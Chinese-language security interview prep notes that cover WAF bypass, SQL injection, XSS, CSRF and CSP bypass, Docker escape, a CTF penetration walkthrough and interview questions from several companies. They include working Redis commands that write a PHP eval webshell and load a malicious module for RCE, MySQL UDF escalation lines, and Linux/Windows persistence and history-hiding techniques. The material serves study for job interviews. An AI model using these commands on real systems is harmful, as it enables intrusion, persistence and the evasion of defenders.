#### waf绕过思路
1. 大小写
2. 编码(unicode,url)
3. 特殊字符(换行,%00,)
4. http参数污染
5. 脏数据(传入一段长数据使waf失效)
6. 高并发
7. 语法糖

#### 任意文件读取利用思路
1. /etc/shadow
2. 源码
3. 配置文件(mysql ,apache,tomcat)
4. 日志文件(tomcat,)
5. 命令执行历史
6. 进程相关信息(cmdline,environ,loginuid当前用户)

#### ssrf打redis
```
#写webshell
config set dir /var/www/html
config set dbfilename aaa.php
set xxx "<?php eval($_GET['php'])"
save

#主从复制rce

config set dir ./
config set dbfilename exp.so
slaveof <ip>

module load exp.so
system.exec 'whoami'
```



#### dockerfile关键字
FROM 基础镜像
RUN 执行命令
CMD 容器启动命令
ENTRYPOINT 入口
COPY 复制文件
ADD 添加文件
ENV 环境变量
VOLUME 定义挂载文件夹
WORKDIR 工作目录,指定容器内部的工作目录
EXPOSE 暴露端口

#### dom型和反射性xss的区别
一个过后端服务器,一个不过

#### jwt了解吗,格式是什么样的,有哪些攻击方式,和cookie有什么区别,优劣


#### 浏览器安全相关的响应头
Content-Security-Policy 设置csp策略
X-Frame-Options 设置iframe
X-XSS-Protection xss保护
Strict-Transport-Security HSTS,仅允许https访问


#### csp了解吗,怎么实现的,csp绕过方式
内容安全策略,通过响应头实现的,限制js加载来源,禁止内联脚本
绕过:
- 缺少base-uri    iframe绕过
- 正则限制        
#### referer校验的绕过(referer为空)
- 浏览器直接输入url
- 跨协议跳转 http->https
- 关键字   a.com->    a.com.b.com,b.com?a.com,a.com@b.com,
- iframe配合data协议
- 配合xss
- get型的csrf配合url跳转

#### csrf_token的后端实现
访问时服务端把csrf_token记录到session里,用户提交表单时校验csrf_token是否与session里的相同

#### 报错注入的原理,手写一个报错注入的语句
extractvalue(0x7e,version(),0x7e)为什么可以回显语句
0x7e='~',不符号xpath的语法要求,则报错


#### 对称加密算法有了解吗,有哪些攻击方式
算法：aes，des
shiro框架有一个aes oracle padding

#### 浏览器从输入url的过程
1. url解析,获取协议,域名,参数等
2. 根据不同的协议发送不同的请求,http,https,file协议
3. 根据域名获取IP地址,hosts文件里查找,没有就做dns递归查询
4. 建立tcp连接,三次握手(ssl握手,通过非对称交换加密密钥)后发送http请求报文,服务器获取报文后发出响应
5. 浏览器解析响应报文,渲染页面(dom树,异步加载)
6. 根据Connection的keep-alive属性,判断是否断开,如果不需要,则关闭连接,tcp4次挥手

#### log4j的漏洞原理
${},对模板里的内容做lookup,导致jndi注入,可以攻击rmi或者ldap

#### docker逃逸漏洞
不安全的配置
- 挂载docker.sock,根目录
- docker remote api 未授权
- 特权模式启动
CVE
- CVE-2024-21626 runc泄露宿主机文件描述符,导致../../../任意文件读取

#### docker判断在特权模式下
`cat /proc/self/status | grep ""`

#### 开发过什么项目吗

### shopee一面
1. 面试官自我介绍
2. 

### shopee二面
1. 面试官自我介绍
2. http3了解吗,你觉得为什么会用udp
3. http1.1 和2有一个keep-alive的区别,这个你觉得有什么用
4. content-length这个字段,为什么要使用它
5. http和https的区别
6. ssl pinning的绕过
7. 为什么要用googlecontent.com和githubcontent.com这俩个域名存放第三方内容而不是google.com
8. jsonp和cors劫持
9. samesite属性设置为Lax,加载第三方图片会把cookie发送出去吗
10. reDos了解吗
11. 盐值加在前面还是后面,有影响吗
12. 哈希长度扩展攻击了解吗
13. 手写一个sql注入的流程,防御思路
14. shiro反序列化的流程,细节
15. jndi注入利用,高版本绕过思路
16. fastjson漏洞,低版本利用
17. fastjson高版本绕过的方式
18. 权限维持方法有哪些
19. 编程:青蛙跳台阶,dp没写出来,只会写递归


### 深信服线下一面
1. fastjson漏洞原理,利用链,各版本绕过
2. mvc框架怎么审计
3. php和java危险函数
4. java的命令执行函数exec特性
5. shiro漏洞原理
6. ctf经历,说了一个羊城杯的决赛渗透

### 中体彩一面
1. 自我介绍
2. 平时怎么自学的
3. 信息收集,收集一个企业有哪些思路
4. 零零信安,它是怎么做的收集
5. 文件上传,ng反代10个服务器,怎么打到你上传的那个服务器
6. frp实战用过吗,流量隐蔽
7. redis,linux和window利用思路

看重实战,每个都问实战有遇到过吗

### 携程一面(25min)
1. 介绍一个实习的渗透项目
2. sast&iast你做了什么
3. 代码审计思路,java的呢,给你一个spring代码怎么审计
4. 用过什么自动化工具吗,codeql规则自己写过吗
5. sql注入思路
6. outfile和dumpfile的区别
7. 站库分离利用思路
8. 前端安全,除了jsonp和cors还有跨域的方法吗
9. cors绕过
10. cs用过吗,cs流量隐蔽
11. ci/cd攻击面
12. 说一下你逆向做过什么,恶意软件检测吗
13. docker逃逸
14. 什么情况下会用到内网穿透
15. 判断是否在容器里的方式,追问什么是cgroup,提示了control group
- linux内核提供的限制单个或多个进程使用资源的机制,比如内存,cpu资源

### 携程二面(20min)
1. 自我介绍
2. 实习期间工作内容
3. sast和iast做了哪些工作?
4. 看你做过云安全,讲讲你写的(cicd,oss,docker)安全
5. 某一渗透项目
6. 反问
7. 为什么选择安全
8. 代码审计了解吗,你有哪些思路


### 羊城杯流程
渗透测试,给了一个ip地址为入口,全端口扫描发现2个web服务,一个ssh.35007是一个开启了debug的thinkphp,通过一个tp的漏洞,可以执行任意函数,ban了很多系统命令函数,没有ban `shell_exec`这个函数,可以执行命令,base64写webshell连蚁剑,上传frp,fscan,linpeas.sh,80端口是一个cms,有一个robots.txt里面的签到flag,也是通过tp的多语言文件包含漏洞,打进去linpeas.sh扫到数据库的账号密码,有一个3306的数据库需要打,udf提权拿到根目录flag.然后开始横向,扫到了3台其他的web服务,frp穿透一个socks5代理出来,一个是confluence的任意文件读取,一个未授权nacos,他的rce是一个python脚本,但需要注意修改为跳板机的IP,并且用跳板机的php -S开启一个web服务.还有一个文件上传拿webshell的站
应急响应:攻击者上传的webshell,linpeas.sh扫出来一个.php文件,直接试了下文件名就成功了.后门,sudo crontab -l可以看到,udf提权用的哪个库,通过show varible 'plugin'可以看到文件路径,列出目录下的所有文件,挨个试一遍;攻击者第一次登录数据库的时间,日志通过find全局查找到,然后通过grep Connect关键字,试了几个时间段就出了


### 华为线下3面


一面(1h)
1. ctf经历->shiro漏洞原理,高版本aes oracle padding
2. fastjson漏洞原理
3. jndi注入,高版本codebase绕过了解吗
4. 继续拷打反序列化
5. 讲一下xss漏洞,怎么防护,有哪些危害?http only在哪设置
6. innerHtml传入`<script>alert(1)</script>`能执行吗
7. csp了解吗?绕过方式有哪些,iframe绕过具体讲讲
8. csrf漏洞原理,防护手段
9. referer校验,我们可以抓包修改,那这个防护手段有用吗
10. samesite属性,cors为什么可以发送请求,但是收不到结果
11. ssrf漏洞原理,黑名单绕过,dns重绑定需要设置什么
12. 讲了一个渗透项目,追问安卓抓包细节,oss任意文件上传限制后缀就能防护了吗
13. 开发语言熟悉哪些?写过哪些插件,二开过什么项目
14. redis未授权怎么打?任意文件写利用思路
15. 问ctf经历,web.xml文件里xml文件解析为jsp怎么写的
16. 学习安全的路线,方法
17. 手撕:sql注入流程



二面(1h)
1. 自我介绍,觉得不够充分,又闲聊了一些内容
2. owasp Top10你觉得有哪些不足,辩证的讲一讲,说说缺点
3. sql注入30年前已经发现了,讲讲怎么挖到新的漏洞,了解国外的cyber sec怎么做的吗
4. 安全相关的网络协议有哪些
5. 正向代理和反向代理的区别,举例说明
6. http协议,请求体结构,方法有哪些?响应体结构,问了100,300俩个状态码
7. http协议的rfc编号   ps:这个真的邪门了
8. hvv细节
9. 浏览器的架构了解吗,哪个引擎负责dom树的解析
10. 讲讲数据库从sql语句执行和存储引擎的交互
11. nmap参数 一个syn半扫描和一个操作系统
12. 用什么大模型?能上谷歌吗?学校提供xxx?:当然不是
13. 手撕: 数组元素的全排列



三面(25min)
1. 自我介绍
2. 考研吗?为什么不考?
3. base地倾向哪
4. 给学校的经历打几分?为什么
5. 从安全的角度看待人工智能这些新技术
6. 为什么选择安全
7. 了解华为的企业文化吗
8. 职业规划
9. 反问



### 京东
介绍一下实习的俩个项目
说了一个支付宝小程序的渗透测试,一个src审核与修复

追问,获取小程序的前端源码起了什么作用
没起作用,下次有用

获取前端源码有哪些利用方式
密钥,ak/sk这种,未授权接口

公网暴露面你怎么排查的,如果sre那边数据不全怎么办
从sre那边获取的域名列表,批量做域名存活探测,在根据body和title获取后管系统,在进行js逆向进行一个弱口令的排查

代码审计你怎么审sql注入,怎么修复
1. 所有有sql注入的地方
2. 预编译+白名单

除了orderby还有哪些地方不能预编译,除了白名单还有修复方式吗
1. order by,group by
2. 表名,列名,limit join等所有不能加引号的位置


现在依赖里有一个fastjson低版本,你怎么判断能否利用
1. pom.xml里有,调用了parse/parseObject,且存在用户可控输入

一个4层服务,rabbitmq未授权rce,你怎么应急
问了下面试官4层服务是啥,就是指那些非http协议,如mysql,redis这种.
建议我了解下nmap的扫描的原理

面试官提示:服务器进程,源码

能提前来实习吗,能实习多久



#### sql注入
sql注入的原理就是将用户的输入直接或间接,拼接到sql语句中,导致用户可以输入一些恶意字符,改变语句原有的语义,从而执行恶意sql语句
报错注入函数:updatexml,extractValue,exp,floor,

udf(用户定义函数)
udf提权利用的是mysql的用户自定义函数功能,
`select hex(load_file()) into dumpfile "/a.txt"`
`create function sys_eval returns string soname"udf.dll'`

写shell:
1. select into outfile,需要知道绝对路径,开启load_file,有写入权限
2. 日志文件,修改日志文件general_log_file的路径
3. 慢查询日志写shell,日志监测文件体积小

绕过:
1. 大小写,双写
2. url编码,unicode编码,
3. substring->mid,sub
4. benchmark->sleep

二次注入


预编译:
sql语句的预编译的原理是先通过占位符,把sql语句进行语义和语法分析,构建ast
1. 以prepareStatement为例,默认情况下,是对传入的字符进行转义
2. 开启了useServerPrepStmts,才会执行mysql层面的预编译
不能预编译的地方
sql关键字、库名表名字段名函数名,order by ,只能拼接,但是这几个地方的集合都是有限的,可以白名单校验



#### xss
反射/dom/存储型
原理:用户传入的参数被直接或间接拼接到了html中,浏览器解析html,生成dom树,本质也是拼接导致dom树解析为新的标签,通过注入js标签/其他标签js事件 导致客户端执行javascript代码

攻击:
1. 直接拼接<script></script>,
2. 其他标签+js事件(onclick onerror)
3. 伪协议 javascript:prompt()
4. 反射性/dom型+短链接生成
5. 富文本xss: 服务端限制:标签和属性白名单 前端过滤:

危害:
网络钓鱼,窃取cookie,执行敏感操作,网页挂马,获取客户端敏感信息,蠕虫攻击

防护:
1. 对于用户的输入过滤,html实体编码,标签和属性白名单/黑名单
2. csp头限制js代码加载的来源
3. 设置httponly


### 常见问题
#### 渗透的流程
- 信息收集
攻击面
公司的ip段,子域名,微信/支付宝/抖音小程序/app/github/云文档/网盘/fofa测绘引擎/ssl证书查询/icon查询/关键字
端口/服务扫描


- 攻击
服务/端口 弱口令
ftp 匿名登录
ssh 弱口令,
web
指纹识别,是否为通用的/开源的->是查找相关漏洞/默认口令,代码审计
常规的渗透测试

- 提权
linux
sudo提权,敏感信息,内核漏洞,suid(查看具有)

- 内网



src挖掘:
单点渗透:


#### 泛解析怎么绕过
1. 使用随机生成的域名,确认存在泛解析
2. 记录解析到的ip地址和ttl值,加入黑名单,后续解析到的不处理


#### 绕过cdn查询真实ip
1. dns历史记录
2. 多地ping
3. 根据证书的ipv4地址
4. 发送邮件,ms查询

#### phpinfo你会关注哪些信息
1. 站点的操作系统/绝对路径/服务器版本/真实ip地址/插件特殊服务fastcgi,imagemagick/敏感配置(disabled_function)


#### 权限维持
linux后门
- 添加后门用户
- 添加ssh公钥到authorized_key文件
- 计划任务crontab,开机启动项
- 替换常用的命令 cat,nologin->bash
- alias后门
隐藏

- 隐藏文件+修改文件时间戳,给文件chattr +i 锁定文件
- 隐藏历史命令 set +o history |history -d 删除
- 隐藏ssh登录

window后门
- 自启动:注册表启动键值设置,计划任务,服务
- dll劫持,进程加载dll如果没找到,会在当前目录下寻找,控制这个dll就可以
